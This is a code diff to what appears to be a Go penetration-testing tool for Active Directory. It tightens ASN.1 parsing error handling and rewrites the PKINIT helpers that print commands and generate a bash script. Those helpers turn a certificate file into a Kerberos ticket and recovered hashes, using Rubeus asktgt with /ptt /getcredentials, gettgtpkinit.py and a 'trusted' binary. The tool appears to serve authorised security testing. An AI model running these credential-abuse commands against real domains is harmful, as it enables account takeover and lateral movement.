@@ -790,14 +790,20 @@ func extractCMSEContent(data []byte) ([]byte, error) {
 
 	// Skip version (INTEGER)
 	var skipRaw asn1.RawValue
-	rest, _ = asn1.Unmarshal(rest, &skipRaw)
+	rest, err := asn1.Unmarshal(rest, &skipRaw)
+	if err != nil {
+		return nil, fmt.Errorf("skip SignedData version: %w", err)
+	}
 
 	// Skip digestAlgorithms (SET OF)
-	rest, _ = asn1.Unmarshal(rest, &skipRaw)
+	rest, err = asn1.Unmarshal(rest, &skipRaw)
+	if err != nil {
+		return nil, fmt.Errorf("skip SignedData digestAlgorithms: %w", err)
+	}
 
 	// Parse encapContentInfo (SEQUENCE)
 	var eciRaw asn1.RawValue
-	_, err := asn1.Unmarshal(rest, &eciRaw)
+	_, err = asn1.Unmarshal(rest, &eciRaw)
 	if err != nil {
 		return nil, fmt.Errorf("parse encapContentInfo: %w", err)
 	}
@@ -1002,7 +1008,7 @@ type PKINITInfo struct {
 
 // PrintPKINITGuidance prints external-tool commands for PKINIT authentication.
 // Use PKINITAuth() for real built-in PKINIT; this function prints commands for
-// certipy-ad, Rubeus, and PKINITtools as a reference.
+// Rubeus and PKINITtools as a reference.
 func PrintPKINITGuidance(info *PKINITInfo) {
 	user := info.TargetUPN
 	if idx := strings.Index(user, "@"); idx > 0 {
@@ -1012,8 +1018,8 @@ func PrintPKINITGuidance(info *PKINITInfo) {
 	fmt.Println("[*] PKINIT commands (external tools):")
 
 	if info.PFXPath != "" {
-		fmt.Println("    # certipy-ad (recommended — also performs UnPAC-the-hash)")
-		fmt.Printf("    certipy-ad auth -pfx %s -dc-ip <DC_IP> -domain %s\n\n", info.PFXPath, info.Domain)
+	fmt.Println("    # PKINIT auth via trusted (also performs UnPAC-the-hash)")
+	fmt.Printf("    KRB5CCNAME=admin.ccache trusted --pkinit -pfx %s --target-dc <DC_IP> --domain %s\n\n", info.PFXPath, info.Domain)
 
 		fmt.Println("    # Rubeus (from Windows)")
 		rubeusCmd := fmt.Sprintf("Rubeus.exe asktgt /user:%s /certificate:%s /ptt /getcredentials", user, info.PFXPath)
@@ -1028,7 +1034,7 @@ func PrintPKINITGuidance(info *PKINITInfo) {
 		pfxPath := strings.TrimSuffix(info.CertPath, filepath.Ext(info.CertPath)) + ".pfx"
 		fmt.Println("    # Convert to PFX first:")
 		fmt.Printf("    openssl pkcs12 -export -in %s -inkey %s -out %s -passout pass:\n\n", info.CertPath, info.KeyPath, pfxPath)
-		fmt.Printf("    certipy-ad auth -pfx %s -dc-ip <DC_IP> -domain %s\n\n", pfxPath, info.Domain)
+		fmt.Printf("    KRB5CCNAME=<USER>.ccache trusted --pkinit -pfx %s --target-dc <DC_IP> --domain %s\n\n", pfxPath, info.Domain)
 	}
 
 	fmt.Println("    # Pass-the-ticket after TGT:")
@@ -1041,8 +1047,7 @@ func PrintPKINITCommands(info *PKINITInfo) {
 	PrintPKINITGuidance(info)
 }
 
-// GeneratePKINITScript writes a bash script automating the PKINIT authentication flow
-// using external tools (certipy-ad or PKINITtools).
+// GeneratePKINITScript writes a bash script automating the PKINIT authentication flow.
 func GeneratePKINITScript(info *PKINITInfo, outputPath string) error {
 	user := info.TargetUPN
 	if idx := strings.Index(user, "@"); idx > 0 {
@@ -1066,12 +1071,15 @@ USER="%s"
 
 echo "[*] PKINIT authentication for ${USER}@${DOMAIN}"
 
-if command -v certipy-ad &>/dev/null; then
-    echo "[+] Using certipy-ad..."
-    certipy-ad auth -pfx "$PFX" -dc-ip "$DC" -domain "$DOMAIN"
+# Native trusted binary — no external dependency
+if command -v trusted &>/dev/null; then
+    echo "[+] Using native trusted binary..."
+    export KRB5CCNAME="${USER}.ccache"
+    trusted --pkinit -pfx "$PFX" --target-dc "$DC" --domain "$DOMAIN"
     exit 0
 fi
 
+# Fallback: PKINITtools
 if command -v gettgtpkinit.py &>/dev/null; then
     echo "[+] Using PKINITtools gettgtpkinit.py..."
     python gettgtpkinit.py "${DOMAIN}/${USER}" "${USER}.ccache" -cert-pfx "$PFX" -pfx-pass ''
@@ -1080,8 +1088,7 @@ if command -v gettgtpkinit.py &>/dev/null; then
     exit 0
 fi
 
-echo "[!] Neither certipy-ad nor gettgtpkinit.py found"
-echo "[*] Install: pip install certipy-ad"
+echo "[!] No PKINIT tool found. Install gettgtpkinit.py or use the trusted binary."
 exit 1
 `, info.TargetUPN, info.Domain, info.DC, pfxPath, info.DC, info.Domain, user)
 
